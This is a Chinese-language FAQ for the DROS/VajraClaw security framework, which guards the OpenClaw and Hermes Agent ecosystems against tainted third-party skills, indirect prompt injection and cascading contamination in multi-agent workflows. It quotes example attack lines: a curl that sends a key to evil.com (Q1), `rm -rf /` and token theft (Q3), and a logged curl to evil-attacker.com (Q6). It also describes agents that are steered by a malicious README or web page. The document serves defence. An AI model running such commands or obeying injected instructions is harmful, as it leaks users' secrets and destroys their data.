# DROS & VajraClaw 零信任安全治理常見問答 (FAQ)
## 針對 OpenClaw 與 Hermes Agent 生態的極客防禦實戰指南

本 FAQ 專為 **OpenClaw** 與 **Hermes Agent** 的開發者及安全極客設計，聚焦於第三方 **Skills (插件/技能)** 的夾帶污染、以及 **Multi-Agent (多智能體)** 串聯工作流中的鏈式越權與物理隔離防禦。

---

## 目錄
1. [Q1: 作為 OpenClaw / Hermes Agent 使用者，下載第三方 Skills 最怕被夾帶指令污染或惡意 System Call，VajraClaw 如何解決？](#q1-作為-openclaw--hermes-agent-使用者下載第三方-skills-最怕被夾帶指令污染或惡意-system-callvajraclaw-如何解決)
2. [Q2: 在 OpenClaw 中，如何利用 `config.yaml` 與 DROS 規則檔實施 Skills 的物理沙箱隔離？](#q2-在-openclaw-中如何利用-configyaml-與-dros-規則檔實實施-skills-的物理沙箱隔離)
3. [Q3: Hermes Agent 桌機版擁有本地 Terminal 執行權限，如何防止 AI 被間接注入（如讀取惡意 README）後在本地「執行 rm -rf 或外傳金鑰」？](#q3-hermes-agent-桌機版擁有本地-terminal-執行權限如何防止-ai-被間接注入後在本地執行-rm--rf-或外傳金鑰)
4. [Q4: Multi-Agent 工作流（如 Agent A 爬蟲 -> Agent B 寫庫）最怕「連鎖污染」與「權限放大」，DROS 的 BEC Chain 憑證鏈如何運作？](#q4-multi-agent-工作流最怕連鎖污染與權限放大dros-的-bec-chain-憑證鏈如何運作)
5. [Q5: 鏈式憑證（BEC Chain）的授權交集計算公式是什麼？會不會大幅拖慢 OpenClaw / Hermes Agent 的運行效率？](#q5-鏈式憑證bec-chain的授權交集計算公式是什麼會不會大幅拖慢-openclaw--hermes-agent-的運行效率)
6. [Q6: 當 OpenClaw / Hermes Agent 協作發生安全攔截時，如何進行「不可否認性審計與責任歸責」？](#q6-當-openclaw--hermes-agent-協作發生安全攔截時如何進行不可否認性審計與責任歸責)
7. [Q7: 運行 DROS & VajraClaw 會不會改變 OpenClaw / Hermes Agent 原本的開發流程？](#q7-運行-dros--vajraclaw-會不會改變-openclaw--hermes-agent-原本的開發流程)

---

### Q1: 作為 OpenClaw / Hermes Agent 使用者，下載第三方 Skills 最怕被夾帶指令污染或惡意 System Call，VajraClaw 如何解決？

*   **極客痛點**：極客們在 Marketplace 下載了第三方寫好的 Skill（如 `FormatCSV` 或 `GitHelper`）。惡意開發者可能在 Skill 的 Prompt 中埋藏指令污染，或者直接在 Python 腳本中寫了 `os.system("curl http://evil.com/leak?key=" + env_key)`。
*   **VajraClaw 物理防禦**：
    1.  **FFI 二進位攔截**：VajraClaw SDK（以 C/Go 撰寫，作為動態連結庫嵌入）橫亙在 Agent 決策引擎與操作系統之間。當遭污染的 Agent 試圖調用 any 敏感工具（讀寫檔案、執行命令、網路發送）時，必須先通過 VajraClaw 的 `evaluateToolCallWithAudit()`。
    2.  **線程級 Syscall 監控**：如果惡意 Skill 試圖繞過 Agent 框架、直接在 Python 代碼中呼叫作業系統底層。DROS 的 **GuardVM** 會在內核/系統調用層級捕獲該線程的 Syscall。一旦發現未在憑證中授權，立刻發送 `SIGKILL` 物理終止進程，防範於未然。

---

### Q2: 在 OpenClaw 中，如何利用 `config.yaml` 與 DROS 規則檔實施 Skills 的物理沙箱隔離？

為了防止第三方 Skills 越權，開發者必須在 DROS 的 `config.yaml` 檔與策略清冊中，針對 `agent.skills.*` 宣告限制。

#### 實戰配置 1：編輯 `config.yaml` 啟用線程隔離
確保你的 `config.yaml` 開啟了 GuardVM 的隔離策略：
```yaml
# ====================== DROS 7.3 Skill 隔離配置 ======================
guard_vm:
  # 啟用線程級執行期隔離
  enable_thread_isolation: true
  
  # 嚴格禁止的敏感系統調用 (針對所有非內建的第三方 Skills)
  forbidden_syscalls:
    - "sys_execve"      # 嚴格禁止 Skill 執行額外的二進位程式
    - "sys_socket"      # 禁止 Skill 自行建立網路連接 (防金鑰外洩)
    
  # Skill 專屬的實體目錄讀寫白名單 (只允許在特定暫存區活動)
  allowed_sandbox_paths:
    - "./scratch"
    - "./User_Pavilion/temp"
```

#### 實戰配置 2：在規則配置（如 `vajra_rules.json`）中鎖定 Skill 憑證 (BEC)
當 OpenClaw 動態載入第三方 Skill 時，系統會為其簽發單次執行憑證 (BEC)。限制規則宣告如下：
```json
{
  "rule_id": "rule_openclaw_skills_default",
  "actor": "agent.skills.*",
  "conditions": { "action": ["read_file", "write_file", "execute_command"] },
  "constraints": {
    "paths": {
      "match": "^\\./(scratch|User_Pavilion/temp)/.*",
      "allow": true
    },
    "commands": { "match": ".*", "allow": false },
    "network": { "outbound": false }
  },
  "behavior": "DENY_AND_ALERT"
}
```
*   **提醒**：將所有非官方認證的 Skills 在載入時自動打上 `untrusted` 標籤，VajraClaw 便會自動套用上述最嚴格的 `DENY_AND_ALERT` 規則。

---

### Q3: Hermes Agent 桌機版擁有本地 Terminal 執行權限，如何防止 AI 被間接注入（如讀取惡意 README）後在本地「執行 rm -rf 或外傳金鑰」？

*   **極客痛點**：Hermes Agent 桌機版在幫你整理本地代碼庫或 Debug 時，被迫讀取了某個包含惡意指令的 Markdown 檔案。AI 被污染後，發出 Terminal 指令：`rm -rf /` 或將你的 `.git/config` 中的 Token 外傳。
*   **VajraClaw 物理防禦**：
    1.  **DFA 狀態機過濾**：Hermes Agent 的輸出與輸入 Token 流被接入 `matchTokenStreamWithAudit()`。VajraClaw 使用 C/Go 實現的高效 DFA 狀態機，能在微秒級內識別並抹除 Token 流中隱藏的危險外連 URL，讓受污染的正版 AI 無法吐出外連路徑。
    2.  **Allowed Scopes 鎖死**：即使 AI 被物理欺騙並調用了 `execute_command` 工具。VajraClaw 檢測到當前執行的 BEC 臨時憑證中，`allowed_scopes` 不包含此目錄的寫入權限，或者命令匹配了黑名單模式，VajraClaw 會直接將該調用攔截並報警，AI 產生的危險指令根本無法抵達作業系統終端。

---

### Q4: Multi-Agent 工作流（如 Agent A 爬蟲 -> Agent B 寫庫）最怕「連鎖污染」與「權限放大」，DROS 的 BEC Chain 憑證鏈如何運作？

*   **連鎖污染 (Cascade Infection)**：Agent A 讀取了惡意網頁被污染，產生了惡意輸出。它隨後調用負責寫入資料庫的 Agent B，要求其執行刪庫。傳統架構中，Agent B 信任同伴（Agent A），於是放行。
*   **DROS 的解決方案：鏈式執行憑證 (BEC Chain)**：
    DROS 要求 Agent 之間的每一次協作調用，都必須在請求頭（Header）中傳遞經密碼學簽名的 **BEC Chain**。
    當高權限 of Agent B 收到 Agent A 的請求時，VajraClaw SDK 會在攔截點自動向上追溯，提取完整呼叫鏈的憑證，進行**授權交集計算**。

---

### Q5: 鏈式憑證（BEC Chain）的授權交集計算公式是什麼？會不會大幅拖慢 OpenClaw / Hermes Agent 的運行效率？

當一個 Agent 協作鏈條為 $Agent_1 \rightarrow Agent_2 \rightarrow \dots \rightarrow Agent_n \rightarrow \text{System Tool}$ 時，VajraClaw 執行以下**動態交集授權運算**：

$$\text{Effective Scope} = \bigcap_{i=1}^{n} \text{Scope}(Agent_i)$$

#### 實例解析：
*   $Agent_A$ (低權限) Scope: `{ Read: /tmp/crawler, Call: Agent B }`
*   $Agent_B$ (高權限) Scope: `{ Read: /database/main, Write: /database/main }`
*   當被污染的 Agent A 委託 Agent B 去寫入資料庫時，VajraClaw 計算其有效交集：
    $$\text{Effective Scope} = \text{Scope}(Agent_A) \cap \text{Scope}(Agent_B) = \emptyset$$
*   由於交集為空，VajraClaw 會在 **1 毫秒內直接熔斷** 該請求，Agent B 的資料庫寫入機制根本不會被觸發。

#### 運行效率實測：
*   **零 Token 消耗**：所有憑證鏈驗證與規則比對均在本地記憶體中完成，**不調用任何遠端 LLM**。
*   **微秒級延遲**：VajraClaw 在 C/Go 底層採用 **O(1) 複雜度的 Bitmap 狀態機算法**。單次規則判定僅需 **10 至 50 微秒**，這對於動輒數百毫秒推論時間的 OpenClaw / Hermes Agent 而言，其性能損耗完全可以忽略不計。

---

### Q6: 當 OpenClaw / Hermes Agent 協作發生安全攔截時，如何進行「不可否認性審計與責任歸責」？

當極客們在跑複雜的 Multi-Agent 工作流且某個環節被 VajraClaw 熔斷時，日誌中會自動寫入經 AIA 私鑰簽章的**密碼學審計日誌**，清晰界定責任歸屬：

```json
{
  "timestamp": "2026-06-10T23:45:00Z",
  "action": "BLOCK_TOOL_CALL",
  "tool": "execute_bash_command",
  "attempted_payload": "curl http://evil-attacker.com/leak",
  "error_code": "ERR_BEC_SCOPE_VIOLATION",
  "bec_chain": [
    { "agent": "OpenClaw_DBManager_Agent", "execution_id": "exec-99b8", "sign": "0x8aef..." },
    { "agent": "OpenClaw_WebCrawler_Agent", "execution_id": "exec-124a", "sign": "0xfd42..." }
  ],
  "taint_analysis": {
    "source": "OpenClaw_WebCrawler_Agent",
    "reason": "Token Stream matched pattern [URL_OUTBOUND_LEAK] from input data stream"
  }
}
```

透過這份日誌中的 `taint_analysis`（污染源分析）與 `bec_chain`（憑證鏈條），管理員與開發者可以瞬間判定：**問題起源於 WebCrawler 導入了髒數據，而非 DBManager 叛變**。這為多智能體系統提供了無可篡改的「責任追溯鐵證」。

---

### Q7: 運行 DROS & VajraClaw 會不會改變 OpenClaw / Hermes Agent 原本的開發流程？

**幾乎無感，唯有在面臨安全攻擊時會「強制介入」。**

*   **開發無感**：開發者在撰寫 Skills 或 Multi-Agent 工作流時，不需要手動修改業務代碼去適應安全框架。只要維持原有的 Python 編寫習慣即可。
*   **配置一次，全局受惠**：唯一的改動是，在系統啟動時，DROS 會接管 Token 流與本地 Tool Call 請求的二進位分發。只有當 Skill 的行為超出 `config.yaml` 或 `rules` 宣告的物理邊界時，開發者才會在終端機看到攔截警報與 `ERR_BEC_SCOPE_VIOLATION`。
*   **這正是極客生態最需要的安全模式**——讓 AI 狂奔的同時，在系統底層裝上防鎖死煞車（ABS），在不影響開發體驗的前提下，守住最後的物理防線。
